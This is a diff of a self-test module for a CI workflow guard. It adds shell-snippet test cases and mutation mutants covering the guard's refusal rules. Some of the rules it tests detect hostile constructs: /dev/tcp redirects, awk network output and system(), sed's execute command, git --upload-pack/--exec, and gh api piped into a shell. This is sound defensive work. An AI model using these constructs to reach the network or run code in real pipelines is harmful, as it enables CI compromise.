+    "r12 F3: a non-literal operand in $(( )) is refused": (_r8("X=$HOME", "echo $(( X + 1 ))"), None, 1, "non-literal operand"),
+    "r12 F3: a non-literal operand written as $X in $(( )) is refused": (_r8("X=$HOME", "echo $(( $X + 1 ))"), None, 1, "non-literal operand"),
+    "r12 F3: a non-literal operand in (( )) is refused": (_r8("X=$HOME", "(( X ))"), None, 1, "(( ))"),
+    "r12 F3: a non-literal operand in [[ -eq ]] is refused": (_r8("X=$HOME", "[[ $X -eq 0 ]]"), None, 1, "non-literal operand"),
+    "r12 F3: a non-literal left operand in [[ -lt ]] is refused": (_r8("X=$HOME", "[[ 0 -lt $X ]]"), None, 1, "non-literal operand"),
+    "r12 F3: declare -i of a non-literal value is refused": (_r8("X=$HOME", "declare -i Y=$X"), None, 1, "non-literal operand"),
+    "r12 F3: ${!X} on a non-literal name is refused": (_r8("X=$HOME", "echo ${!X}"), None, 1, "non-literal operand"),
+    "r12 F3: declare -n to a non-literal name is refused": (_r8("X=$HOME", "declare -n R=$X"), None, 1, "non-literal operand"),
+    "r12 F3: test -v on a non-literal name is refused": (_r8("X=$HOME", "test -v \"$X\""), None, 1, "non-literal operand"),
+    "r12 F3: [ -v ] on a non-literal name is refused": (_r8("X=$HOME", "[ -v \"$X\" ]"), None, 1, "non-literal operand"),
+    "r12 F3: a non-literal substring offset is refused": (_r8("X=$HOME", "echo ${S:$X:1}"), None, 1, "non-literal operand"),
+    "r12 F3: a non-literal read subscript is refused": (_r8("X=$HOME", "echo ${ary[X]}"), None, 1, "non-literal operand"),
+    "r12 F3: a for-loop variable over a variable list in $(( )) is refused": (_r8("for i in $list; do echo $(( i )); done"), None, 1, "non-literal operand"),
+    "r12 F3: a for-loop variable over seq output in $(( )) is refused (the publish-ci-image shape)": (_r8("for i in $(seq 1 60); do echo $((i*2)); done"), None, 1, "non-literal operand"),
+    "r12 F3: a for-loop variable over a letter brace range is refused": (_r8("for i in {a..c}; do echo $(( i )); done"), None, 1, "non-literal operand"),
+    "r12 F3: a for-loop variable over a quoted number is refused": (_r8("for i in \"1\"; do echo $(( i )); done"), None, 1, "non-literal operand"),
+    "r12 F3: a for-loop variable over positional parameters is refused": (_r8("for i; do echo $(( i )); done"), None, 1, "non-literal operand"),
+    "r12 F3: a for-loop variable with a plain and an expanded header is refused": (_r8("for i in 1 2; do :; done", "for i in $x; do echo $(( i )); done"), None, 1, "non-literal operand"),
+    "r12 F3: a C-style loop comparing to a variable is refused": (_r8("for ((i=0;i<n;i++)); do echo $((i*2)); done"), None, 1, "non-literal operand"),
+    "r12 F3: a C-style loop header with an expansion is refused": (_r8("for ((i=0;i<$n;i++)); do :; done"), None, 1, "plain-number loop"),
+    "r12 F3: a for-loop variable over a numeric brace range is accepted": (_r8("for i in {1..60}; do echo $((i*2)); done"), None, 0, ""),
+    "r12 F3: a for-loop variable over a stepped numeric brace range is accepted": (_r8("for i in {1..60..5}; do echo $((i*2)); done"), None, 0, ""),
+    "r12 F3: a for-loop variable over plain numbers is accepted": (_r8("for i in 1 2 3; do echo $((i*2)); done"), None, 0, ""),
+    "r12 F3: a C-style loop over plain numbers is accepted": (_r8("for ((i=0;i<3;i++)); do echo $((i*2)); done"), None, 0, ""),
+    "r12 F3: an array-valued name in $(( )) is refused": (_r8("N=(1 2)", "echo $(( N ))"), None, 1, "non-literal operand"),
+    "r12 F3: a name with one plain and one expanded assignment is refused": (_r8("N=5", "N=$HOME", "echo $(( N ))"), None, 1, "non-literal operand"),
+    "r12 F3: a command substitution as an operand is refused": (_r8("echo $(( $(true) + 1 ))"), None, 1, "non-literal operand"),
+    # --- Sweep rows (Round 12): one row per mutant the first impact-selected sweep left alive.
+    "r12 F1 ok: a delimiter that ends at a semicolon is read as that word": (_r8("cat <<E;echo ok", "text", "E"), None, 0, ""),
+    "r12 F2: a substitution on the line after the open bracket of a quoted value is refused": (_r8("echo 'a[", "$(./f)]'"), None, 1, "subscript"),
+    "r12 F3: declare -i of an array name with a plain value is refused": (_r8("N=(1 2)", "declare -i N=3"), None, 1, "non-literal operand"),
+    "r12 F3: declare -i of a subscripted name with an unreadable value is refused": (_r8("declare -i 'a[0]'=' 1 ;'"), None, 1, "non-literal operand"),
+    "r12 F3: declare of an expanded name is refused": (_r8("declare $X"), None, 1, "of `declare`"),
+    "r12 F3: a name declared -a is not literal": (_r8("declare -a N", "echo $(( N ))"), None, 1, "non-literal operand"),
+    "r12 F3: a nameref is not literal": (_r8("declare -n R=1", "echo $(( R ))"), None, 1, "non-literal operand"),
+    "r12 F3: the target of a nameref is not literal": (_r8("X=1", "declare -n R=X", "echo $(( X ))"), None, 1, "non-literal operand"),
+    "r12 F3: a positional parameter read as a name is refused": (_r8("echo ${!1}"), None, 1, "non-literal operand"),
+    "r12 F3: a single-quoted value holding $name is not literal": (_r8("X='$HOME'", "echo $(( X ))"), None, 1, "non-literal operand"),
+    "r12 F3: a quoted value with a character outside the arithmetic tokens is not literal": (_r8("X='a;b'", "echo $(( X ))"), None, 1, "non-literal operand"),
+    "r12 F3: the subscript of an indirect read is checked": (_r8("X=$HOME", "echo ${!ary[X]}"), None, 1, "non-literal operand"),
+    "r12 F3: a refusal beside an env write is reported once": (
+        _r8("echo \"RUSTFLAGS=-Zx\" >> \"$GITHUB_ENV\"", "X=$HOME", "echo $(( X ))"), None, 1, "sets"),
+    "r12 F3: a matrix value that makes an operand non-literal is refused": (
+        _r7_steps("      - run: |\n          X=$HOME\n          echo $(( ${{ matrix.k }} ))\n", head=R8_MATRIX % "X"), None, 1, "matrix value"),
+    # --- F3: accepted (green at both).
+    "r12 F3 ok: literal arithmetic $(( 1 + 2 )) passes": (_r8("echo $(( 1 + 2 ))"), None, 0, ""),
+    "r12 F3 ok: $(( N )) with N a plain number passes": (_r8("N=5", "echo $(( N ))"), None, 0, ""),
+    "r12 F3 ok: the release.yml counter shape passes": (
+        _r8("emitted=0", "for t in a b; do", "emitted=$((emitted + 1))", "done", "[ \"$emitted\" -eq 0 ]"), None, 0, ""),
+    "r12 F3 ok: [[ $N -eq 5 ]] with N a plain number passes": (_r8("N=5", "[[ $N -eq 5 ]]"), None, 0, ""),
+    "r12 F3 ok: [ \"$attempt\" -lt 3 ] with a plain number passes": (_r8("attempt=1", "[ \"$attempt\" -lt 3 ]"), None, 0, ""),
+    "r12 F3 ok: a defaulted operand ${approved:-0} in [ -ge ] passes": (_r8("[ \"${approved:-0}\" -ge 1 ]"), None, 0, ""),
+    "r12 F3 ok: ${X:0:3} passes": (_r8("echo ${X:0:3}"), None, 0, ""),
+    "r12 F3 ok: ${X: -1} passes": (_r8("echo ${X: -1}"), None, 0, ""),
+    "r12 F3 ok: ${X:$N} with N a plain number passes": (_r8("N=2", "echo ${X:$N}"), None, 0, ""),
+    "r12 F3 ok: ${!ary[@]} passes": (_r8("echo ${!ary[@]}"), None, 0, ""),
+    "r12 F3 ok: ${!pre*} passes": (_r8("echo ${!pre*}"), None, 0, ""),
+    "r12 F3 ok: test -v HOME passes": (_r8("test -v HOME"), None, 0, ""),
+    "r12 F3 ok: [ -v HOME ] passes": (_r8("[ -v HOME ]"), None, 0, ""),
+    "r12 F3 ok: an associative array read with a loop key passes (release.yml ABI_OF shape)": (
+        _r8("declare -A ABI_OF=(", "[a]=x", ")", "for TARGET in a; do", "ABI=\"${ABI_OF[$TARGET]}\"", "done"), None, 0, ""),
+    "r12 F3 ok: declare -i N=5 passes": (_r8("declare -i N=5"), None, 0, ""),
+    "r12 F3 ok: declare -n R=X passes": (_r8("declare -n R=X"), None, 0, ""),
+    "r12 F3 ok: a plain $'abc' passes": (_r8("echo $'abc'"), None, 0, ""),
+    "r12 F3 ok: a quoted plain string assignment then $(( N )) passes": (_r8("N='7'", "echo $(( N ))"), None, 0, ""),
+}
+
+
+def cargo_config_twins() -> List[str]:
+    """Round 9 (sec r8 F2): the problems of CARGO_CONFIG_ENV_TWINS: every key `cargo --config` is refused for has an
+    environment twin that DANGEROUS_ASSIGN_RE (or the flag rule) refuses."""
+    bad: List[str] = []
+    for key, env in CARGO_CONFIG_ENV_TWINS:
+        if not (DANGEROUS_ASSIGN_RE.fullmatch(env) or RUSTFLAGS_NAME_RE.fullmatch(env)):
+            bad.append(f"`cargo --config {key}` has the environment twin `{env}`, which is not refused")
+    return bad
 
 
 def self_test(root: Path) -> int:
@@ -2276,6 +6245,61 @@ def self_test(root: Path) -> int:
                       file=sys.stderr)
                 failures += 1
 
+        for name, (edits, needle) in JOINED_CASES.items():
+            case_root = tmp / "case"
+            mk_root(root, case_root)
+            for rel, old, new, every in edits:
+                mutate_file(case_root / rel, old, new, every)
+            errs, _ = run_guard(case_root)
+            if needle not in " | ".join(errs):
+                print(f"self-test FAIL: '{name}' wanted a message containing {needle!r}: {errs[:3]}", file=sys.stderr)
+                failures += 1
+
+        for name, (doc_text, files, count, needle) in R5_CASES.items():
+            errs = r5_errors(doc_text, files, tmp / "r5")
+            if len(errs) != count or (needle and needle not in " | ".join(errs)):
+                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
+                      file=sys.stderr)
+                failures += 1
+
+        for name, (doc_text, files, count, needle) in R7_CASES.items():
+            errs = r5_errors(doc_text, files, tmp / "r7")
+            if len(errs) != count or (needle and needle not in " | ".join(errs)):
+                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
+                      file=sys.stderr)
+                failures += 1
+
+        for name, (doc_text, files, count, needle) in R8_CASES.items():
+            errs = r5_errors(doc_text, files, tmp / "r8")
+            if len(errs) != count or (needle and needle not in " | ".join(errs)):
+                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
+                      file=sys.stderr)
+                failures += 1
+        for name, (doc_text, files, count, needle) in R9_CASES.items():
+            errs = r5_errors(doc_text, files, tmp / "r9")
+            if len(errs) != count or (needle and needle not in " | ".join(errs)):
+                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
+                      file=sys.stderr)
+                failures += 1
+        for name, (doc_text, files, count, needle) in R11_CASES.items():
+            errs = r5_errors(doc_text, files, tmp / "r11")
+            if len(errs) != count or (needle and needle not in " | ".join(errs)):
+                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
+                      file=sys.stderr)
+                failures += 1
+        for name, (doc_text, files, count, needle) in R12_CASES.items():
+            errs = r5_errors(doc_text, files, tmp / "r12")
+            if len(errs) != count or (needle and needle not in " | ".join(errs)):
+                print(f"self-test FAIL: '{name}' wanted {count} message(s) containing {needle!r}: {errs[:3]}",
+                      file=sys.stderr)
+                failures += 1
+        for twin in cargo_config_twins():
+            print(f"self-test FAIL: {twin}", file=sys.stderr)
+            failures += 1
+        if RUN_ALLOWED != tuple(sorted(RUN_ALLOWED)):
+            print("self-test FAIL: RUN_ALLOWED is not sorted", file=sys.stderr)
+            failures += 1
+
         # --- through the real entry point: exit codes for unreadable input.
         for name, (setup, want_rc) in ENTRY_CASES.items():
             case_root = tmp / "entry"
@@ -2291,7 +6315,8 @@ def self_test(root: Path) -> int:
         "check_release_features: self-test OK "
         f"(a failing or empty declaration fails the build step and the Dockerfile RUN; "
         f"{len(CASES)} guard cases, {len(ADVISORY_CASES)} advisory cases, {len(MESSAGE_CASES)} message cases, "
-        f"{len(PARITY)} parity cases, {len(SCALARS)} scalar cases, {len(ENTRY_CASES)} entry-point cases)"
+        f"{len(PARITY)} parity cases, {len(SCALARS)} scalar cases, {len(ENTRY_CASES)} entry-point cases, "
+        f"{len(R5_CASES)} round-5/6 cases, {len(R7_CASES)} round-7 cases, {len(R8_CASES)} round-8 cases, {len(R9_CASES)} round-9 cases, {len(R11_CASES)} round-11 cases, {len(R12_CASES)} round-12 cases, {len(JOINED_CASES)} joined cases)"
     )
     return 0
 
@@ -2436,6 +6461,190 @@ CONDITION_MUTANTS: Tuple[Tuple[str, str, str], ...] = (
     ("BuildKit join strips the next line's indent", "            piece = raw\n", '            piece = raw.lstrip(" \\t")\n'),
     ("BuildKit continuation needs a bare backslash", r'BK_CONT_RE = re.compile(r"(^|[^\\])\\[ \t]*$")', r'BK_CONT_RE = re.compile(r"(^|[^\\])\\$")'),
     ("BuildKit continuation on an escaped backslash", r'(^|[^\\])\\[ \t]*$', r'\\[ \t]*$'),
+    ("per-action key not case-folded", 'USES_BY_ACTION.get("/".join(seg.lower() for seg in segs[:2]))',
+     'USES_BY_ACTION.get("/".join(seg for seg in segs[:2]))'),
+    ("per-action key includes the subpath", 'for seg in segs[:2]))', 'for seg in segs[:3]))'),
+    ("per-action sha not compared", 'if want is not None and sha != want.partition("@")[2] and not', 'if False and not'),
+    ("local action outside the tree allowed", 'if tree != target and tree not in target.parents:', 'if False:'),
+    ("local action cycle not refused", 'if target in chain:', 'if False:'),
+    ("local action depth not limited", 'MAX_LOCAL_DEPTH = 8  # nested', 'MAX_LOCAL_DEPTH = 80  # nested'),
+    ("local action.yaml not read", 'for f in ("action.yml", "action.yaml")', 'for f in ("action.yml",)'),
+    ("local action treated as a plain ref", 'if ref.startswith("./"):', 'if False:'),
+    ("docker use not exempt from the segment check", 'if spec.startswith("docker://"):\n        return', 'if False:\n        return'),
+    ("node main may escape the action", '(target != entry and target not in entry.parents) or ', 'False or '),
+    ("node main need not exist", ' or not entry.is_file():', ':'),
+    ("needs list members not typed", 'all(n.kind == "scalar" for n in needs.value)', 'True'),
+    ("needs mapping allowed", 'needs.kind == "scalar" or (', 'True or ('),
+    ("reusable workflow job needs steps", 'if job.get("uses") is not None and steps is None:', 'if False:'),
+    ("expression path shape not checked", 'if not EXPR_PATH_RE.fullmatch(path):', 'if False:'),
+    ("matrix key need not be in the matrix", 'return len(parts) == 2 and parts[1] in ctx.matrix', 'return len(parts) == 2'),
+    ("matrix path length not checked", 'return len(parts) == 2 and parts[1] in ctx.matrix', 'return parts[1] in ctx.matrix'),
+    ("secrets path length not checked", 'return len(parts) == 2\n    if parts[0] == "steps":', 'return True\n    if parts[0] == "steps":'),
+    ("steps path length not checked", 'return len(parts) == 4 and parts[2] == "outputs" and', 'return parts[2] == "outputs" and'),
+    ("steps path need not be outputs", 'return len(parts) == 4 and parts[2] == "outputs" and', 'return len(parts) == 4 and'),
+    ("steps id need not be safe", 'and parts[1] in ctx.safe and parts[1] not in ctx.tainted', 'and parts[1] not in ctx.tainted'),
+    ("steps id may be tainted", 'and parts[1] in ctx.safe and parts[1] not in ctx.tainted', 'and parts[1] in ctx.safe'),
+    ("tainting env refs ignored", 'dirty = bool(TAINT_ENV_RE.search(body)) or not all(', 'dirty = False or not all('),
+    ("tainting expressions ignored", 'or not all(expr_allowed(e, ctx) for e in step_exprs(step))', 'or False'),
+    ("taint does not spread", 'tainted.add(sid)\n                changed = True', 'tainted.add(sid)\n                changed = False'),
+    ("here-document in a fetch step allowed", 'if scan.heredocs:', 'if False:'),
+    ('dangerous assignment in a fetch step allowed', 'if DANGEROUS_ASSIGN_RE.fullmatch(name):\n            return f"an assignment to', 'if False:\n            return f"an assignment to'),
+    ("GITHUB_ENV write in a fetch step allowed", 'if any(FETCH_FILE_RE.search(w) for w in scan.words):', 'if False:'),
+    ('fetch command allow-list not applied', 'if not literal or (word not in FETCH_ALLOWED and not captured[k]):', 'if False:'),
+    ('fetch command may be non-literal', 'if not literal or (word not in FETCH_ALLOWED and not captured[k]):', 'if (word not in FETCH_ALLOWED and not captured[k]):'),
+    ('tar options not checked', 'if word == "tar":\n            for n, (arg, _lit) in enumerate(args):', 'if False:\n            for n, (arg, _lit) in enumerate(args):'),
+    ("git clone is not a fetch", 'clone = any(w == "git" and', 'clone = False and any(w == "git" and'),
+    ("runs-on label list not applied", 'ok = text in HOSTED_RUNNERS', 'ok = bool(text)'),
+    ("runs-on matrix may be empty", 'ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)', 'ok = all(v in HOSTED_RUNNERS for v in values)'),
+    ("runs-on matrix values not checked", 'ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)', 'ok = bool(values)'),
+    ("runs-on flow list accepted", 'if ro.kind == "scalar" and ro.style == "plain" else ""', 'if ro.kind == "scalar" else ""'),
+    ("forbidden triggers allowed", 'bad = [t for t in on_triggers(on) if t in ON_FORBIDDEN]', 'bad = []'),
+    ("on: pin not compared", 'if pin is not None and json.dumps(', 'if False and json.dumps('),
+    ("local action walked more than once", 'if target in rep.walked:', 'if False:'),
+    ("image digest length not pinned", r'IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]{64}")',
+     r'IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]+")'),
+    ("docker action digest length not pinned", r'DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64}")',
+     r'DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]+")'),
+    ("container never inspected", 'if container is not None:', 'if False:'),
+    ("dot segment not refused",'if any(seg in ("", ".", "..") for seg in segs):', 'if any(seg in ("",) for seg in segs):'),
+    # --- Round 7
+    ("job and workflow env never taint", 'env_dirty or dirty', 'dirty'),
+    ("workflow env not read", '(doc.get("env"), job.get("env"))', '(job.get("env"),)'),
+    ("job env not read", '(doc.get("env"), job.get("env"))', '(doc.get("env"),)'),
+    ("GITHUB_ENV relay ignored", 'dirty or relay or', 'dirty or False or'),
+    ("file relay ignored", 'any(n in body for n in names)', 'False'),
+    ("unreadable relay ignored", '"\\0unreadable" in names', 'False'),
+    ("legacy set-output not a writer", 'writer = "GITHUB_OUTPUT" in body or "set-output" in body', 'writer = "GITHUB_OUTPUT" in body'),
+    ("pwsh shell allowed", 'SHELL_ALLOWED = ("bash", "sh")', 'SHELL_ALLOWED = ("bash", "sh", "pwsh", "python")'),
+    ("windows run needs no shell", 'elif ctx.windows and not ctx.default_shell:', 'elif False:'),
+    ("windows default shell ignored", 'elif ctx.windows and not ctx.default_shell:', 'elif ctx.windows:'),
+    ("windows runner label not read", 'return text.startswith("windows")', 'return False'),
+    ("windows matrix leg not read", 'return any(v.lower().startswith("windows") for v in matrix_os_values(job))', 'return False'),
+    ("expression matrix value allowed", 'if matrix is not None and any("${{" in t for t in node_texts(matrix)):', 'if False:'),
+    ("dev tcp redirect allowed", 'if DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw):', 'if EXEC_FD_RE.search(raw):'),
+    ("exec descriptor allowed", 'if DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw):', 'if DEV_NET_RE.search(raw):'),
+    ("downloaded file matched by substring", 'parts = {p for w in words for p in re.split(r"[/=:]", w)}', 'parts = {p for w in words for p in [w] + [w[:k] for k in range(len(w))]}'),
+    ("downloads not remembered", 'ctx.fetched.add(base)', 'pass'),
+    ("computed redirect allowed", 'if "$" in target or "`" in target:', 'if False:'),
+    ("bin directory allowed", 'if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):', 'if False:'),
+    ("tar -C directory refused", 'if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):', 'if not URL_RE.match(w) and BIN_DIR_RE.search(w):'),
+    ("url with a bin path refused", 'if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):', 'if w not in tar_dirs and BIN_DIR_RE.search(w):'),
+    ("verify may sit in a subshell", 'if is_verify(word, args) and info["top"] and', 'if is_verify(word, args) and'),
+    ("negated verify counts", 'and not start["neg"] and', 'and'),
+    ("verify may follow &&", 'start["prev"] in ("\\n", ";"):', 'start["prev"] in ("\\n", ";", "&&", "||"):'),
+    ("pipeline start not followed", 'while first > 0 and scan.info[first]["prev"] == "|":', 'while False:'),
+    ("docker run of a tag allowed", 'if not (IMAGE_DIGEST_RE.fullmatch(image) or image in local):', 'if False:'),
+    ("docker run of any local tag refused", 'if not (IMAGE_DIGEST_RE.fullmatch(image) or image in local):', 'if not IMAGE_DIGEST_RE.fullmatch(image):'),
+    ("function definition refused", 're.fullmatch(r"\\w+", name[0]) and re.match(', 're.fullmatch(r"\\w+", name[0]) and False and re.match('),
+    ("walked action keeps no height", 'if len(chain) + height > MAX_LOCAL_DEPTH:', 'if False:'),
+    ("walked action height forgotten", 'height = rep.heights.get(target, 1)', 'height = 1'),
+    ("cycle not refused", 'if target in chain:', 'if False:'),
+    ("depth limit raised", 'if len(chain) >= MAX_LOCAL_DEPTH:', 'if len(chain) >= 80:'),
+    ("arithmetic body not walked", 'return self.walk_arithmetic(i)', 'self.i = self.s.index("))", i) + 2\n            return "$(())"'),
+    ('tar long option not checked', 'good = TAR_LONG_RE.fullmatch(arg) is not None', 'good = True'),
+    ('tar first argument not checked', 'good = arg.startswith("-") or n == 0', 'good = True'),
+    ('downloaded file never looked for', 'if f in parts or any(glob_hit(f, p) for p in parts)', 'if any(glob_hit(f, p) for p in parts)'),
+    ('downloaded file glob never looked for', 'if f in parts or any(glob_hit(f, p) for p in parts)', 'if f in parts'),
+    ('glob needs no other character', 'and bool(part.strip("*?[]")) and', 'and True and'),
+    ('later step needs no checksum', 'if hit in verified or (hit.endswith(".sha256") and hit[:-len(".sha256")] in verified):', 'if True:'),
+    ('sha256 companion of any name exempt', 'and hit[:-len(".sha256")] in verified):', 'and True):'),
+    ('consumer of a named file needs no checksum', 'missing = [n for n in named if n not in covered]', 'missing = []'),
+    ('consumer of no named file needs no checksum', 'elif not (any_ok or chained):', 'elif False:'),
+    ('verify and consumer chain refused', 'extra = chain[1] if chained and chain is not None else set()', 'extra = set()'),
+    ('chain must be adjacent', 'chain[0] == k - 1 and info["prev"] == "&&"', 'info["prev"] == "&&"'),
+    ('output over a command name allowed', 'if base_of(out) in FETCH_ALLOWED:', 'if False:'),
+    ('gh any subcommand allowed', 'if texts[:1] != ["api"]:\n        return f"`gh ', 'if False:\n        return f"`gh '),
+    ('gh api refused', 'if texts[:1] != ["api"]:\n        return f"`gh ', 'if True:\n        return f"`gh '),
+    ('gh attestation verify refused', 'if plain[:2] == ["attestation", "verify"]:\n        return ""', 'if False:\n        return ""'),
+    ('script flags skipped', 'while word != "source" and n < len(args) and flags.fullmatch(args[n][0]):', 'while False:'),
+    ('script path unchecked', 'if not ok or ".." in path:', 'if False:'),
+    ('script dot-dot allowed', 'if not ok or ".." in path:', 'if not ok:'),
+    ('function body counted as top level', 'lv.stack.append("fn" if text == "{" and lv.fn_next else text)', 'lv.stack.append(text)'),
+    ('function body not in the top-level test', 'any(k in ("if", "while", "until", "case", "fn") for k in lv.stack)', 'any(k in ("if", "while", "until", "case") for k in lv.stack)'),
+    ('docker global option allowed', 'if not texts or texts[0].startswith("-"):\n        return "`docker`', 'if not texts:\n        return "`docker`'),
+    ('docker unknown option allowed', 'elif tok.split("=")[0] not in DOCKER_VALUE_OPTS and tok not in DOCKER_FLAG_OPTS:', 'elif False:'),
+    ('docker subcommand list not applied', 'if sub not in RUN_DOCKER:', 'if False:'),
+    ('git global option allowed', 'if not texts or texts[0].startswith("-"):\n        return "`git`', 'if not texts:\n        return "`git`'),
+    ('git subcommand list not applied', 'if texts[0] not in RUN_GIT:', 'if False:'),
+    ('git program option allowed', 'if any(a.split("=")[0] in ("--upload-pack", "--receive-pack", "--exec") for a in texts):', 'if False:'),
+    ('git config any key allowed', 'if keys[:1] not in (["user.name"], ["user.email"]):', 'if False:'),
+    ('cargo --config allowed', 'if any(a == "--config" or a.startswith("--config=") for a in texts):', 'if False:'),
+    ('cargo subcommand list not applied', 'if not plain or plain[0] not in RUN_CARGO:', 'if False:'),
+    ('cargo install unlocked', 'if not (crates and locked and version):', 'if not crates:'),
+    ('cargo install any crate', 'elif arg.startswith("-") or arg not in RUN_CARGO_CRATES:', 'elif arg.startswith("-"):'),
+    ('echoed checklist from a download allowed', 'if any(base_of(f) in downloaded for f in files):', 'if False:'),
+    ('checklist pipe from any command allowed', 'if not (plit and pword in ("echo", "printf")):', 'if False:'),
+    ('fetch in a substitution allowed', 'if info["sub"]:', 'if False:'),
+    ('wget default name not recorded', 'if not curl and not named:', 'if False:'),
+    ('secret command word refused', 'if word == "$__GHS__":', 'if False:'),
+    ('computed command word allowed', 'return f"the computed command word `{word[:40]}`"', 'continue'),
+    ('scalar defaults allowed', 'if held is not None and held.kind != "map":', 'if False:'),
+    ('env BASH_ENV allowed', 'if DANGEROUS_ASSIGN_RE.fullmatch(key) or rustflags_bad(key, vtext):', 'if False:'),
+    ('tool URL argument allowed', 'if word in RUN_URL_TOOLS and any(', 'if False and any('),
+    ('openssl any subcommand', 'if not texts or texts[0] not in RUN_OPENSSL:', 'if False:'),
+    ('pipx any package', 'return "" if not [a for a in texts if a.startswith("-")] and tuple(plain) in RUN_PIPX else', 'return "" if True else'),
+    ('apt-get any package', 'plain[:1] == ["install"] and pkgs and all(p in RUN_APT_PKGS for p in pkgs))):', 'plain[:1] == ["install"] and pkgs)):'),
+    ('awk pipe allowed', 'return "`awk` with a pipe to or from a command"', 'i, prev = i + 1, "|"\n            continue'),
+    ('sed execute command allowed', 'return "`sed` with the `e` command, which runs a command"', 'pass'),
+    ('wrapper command unchecked', 'return command_problem(rest[0][0], rest[1:], ctx, depth + 1)', 'return ""'),
+    ('function shadowing a listed command allowed', 'if name in RUN_ALLOWED:\n            return f"a function named', 'if False:\n            return f"a function named'),
+    # --- Round 9: one mutant per new rule (code r8 F1-F10, security r8 F1-F3)
+    ('awk program file option allowed', 'if arg.startswith("-") and arg != "-":\n            return f"`awk` with the option', 'if False:\n            return f"`awk` with the option'),
+    ('awk expanded program allowed', 'if is_exp(prog):\n        return "`awk` with a program held', 'if False:\n        return "`awk` with a program held'),
+    ('awk system or getline allowed', 'if ident in ("system", "getline"):', 'if False:'),
+    ('awk @load allowed', 'if c == "@":', 'if False:'),
+    ('awk print to a computed path allowed', 'if prog[j:j + 1] != \'"\':', 'if False:'),
+    ('awk print to a network file allowed', 'if "/inet" in target:', 'if False:'),
+    ('awk redirect with trailing text allowed', 'if k < size and prog[k] not in ";}\\n#":', 'if False:'),
+    ('sed program file short option allowed', 'return f"`sed` with the option `-{ch}` (program files, `-s` and unknown options are refused)"', 'continue'),
+    ('sed long option allowed', 'return f"`sed` with the option `{arg[:30]}` (program files, `-s` and unknown options are refused)"', 'continue'),
+    ('sed execute flag allowed', 'if flag not in SED_FLAG_CHARS:', 'if False:'),
+    ('sed r or w command to a computed path allowed', 'if not path.strip() or (exp and ("$" in path or "`" in path)):\n                return f"`sed` with a `{cmd}`', 'if False:\n                return f"`sed` with a `{cmd}`'),
+    ('sed w flag to a computed path allowed', 'if not path.strip() or (exp and ("$" in path or "`" in path)):\n                        return "`sed` with a `w` flag', 'if False:\n                        return "`sed` with a `w` flag'),
+    ('sed address from an expansion allowed', 'if bad_pos(ch):\n                return "`sed` with an address that comes', 'if False:\n                return "`sed` with an address that comes'),
+    ('sed unknown command allowed', 'return f"`sed` with the command `{cmd}`, which the guard does not read"', 'pass'),
+    ('sed trailing command text allowed', 'if pos < size and script[pos] not in "\\n;}#":\n            return f"`sed` with `', 'if False:\n            return f"`sed` with `'),
+    ('tar long option list not applied', 'if arg[2:].partition("=")[0] not in TAR_LONG_OK:', 'if False:'),
+    ('tar -I and -F allowed', 'if TAR_RUN_SHORT & set(arg[1:]):', 'if False:'),
+    ('tar option cluster with I allowed', 'elif n == 0 and TAR_RUN_SHORT & set(arg):', 'elif False:'),
+    ('gh api endpoint list not applied', 'if not any(p.fullmatch(endpoint) for p in GH_API_READONLY):', 'if False:'),
+    ('gh api pipe into a shell allowed', 'if scan.info[k]["nxt"] in ("|", "|&") and k + 1 < len(scan.cmds) and (', 'if False and scan.info[k]["nxt"] in ("|", "|&") and k + 1 < len(scan.cmds) and ('),
+    ('gh api extra option allowed', 'if arg.startswith("-") or endpoint:', 'if endpoint:'),
+    ('git show of a ref path in a substitution allowed', 'if texts[0] == "show" and any(GIT_REF_PATH_RE.fullmatch(a) for a in texts[1:]) and site is not None \\', 'if False and texts[0] == "show" and any(GIT_REF_PATH_RE.fullmatch(a) for a in texts[1:]) and site is not None \\'),
+    ('openssl code option allowed', 'if name in OPENSSL_CODE_OPTS:', 'if False:'),
+    ('openssl computed config path allowed', 'if not path or is_exp(path) or path.startswith("/") or ".." in path or path.startswith("-"):', 'if False:'),
+    ('print-only checksum counts as a verify', 'if word in FETCH_VERIFIERS and is_verify(word, args):\n            out.update', 'if word in FETCH_VERIFIERS:\n            out.update'),
+    ('comparison with a literal digest not credited', 'elif word in ("[", "[[", "test"):\n            names = compare_names(scan, k)', 'elif False:\n            names = compare_names(scan, k)'),
+    ('comparison with any word credited', 'if not any(HEX64_RE.fullmatch(a) and not is_exp(a) for a, _l in args):', 'if False:'),
+    ('comparison credit for a later step dropped', 'out.update(compare_names(scan, k) or set())', 'pass'),
+    ('digest variable assigned in the job allowed', 'if any(m.group(1) in madeset for m in DIGEST_VAR_RE.finditer(digest_token(pword, pargs))):', 'if False:'),
+    ('script computed path allowed', 'if n >= len(args) or is_exp(args[n][0]):', 'if n >= len(args):'),
+    ('captured gh or git output not a fetch', 'if captured[k]:  # Round 9 (F4)', 'if False:  # Round 9 (F4)'),
+    ('captured fetch alone not a fetch step', 'if not clone and not any(captured) and not any(FETCH_WORD_RE.search(w) for w in scan.words):', 'if not clone and not any(FETCH_WORD_RE.search(w) for w in scan.words):'),
+    ('matrix mapping value not marked', 'if node.kind == "map":\n            return [MATRIX_COMPLEX]', 'if False:\n            return [MATRIX_COMPLEX]'),
+    ('matrix complex key never named', 'MATRIX_COMPLEX in ctx.matrix_values.get(parts[1], ())', 'False'),
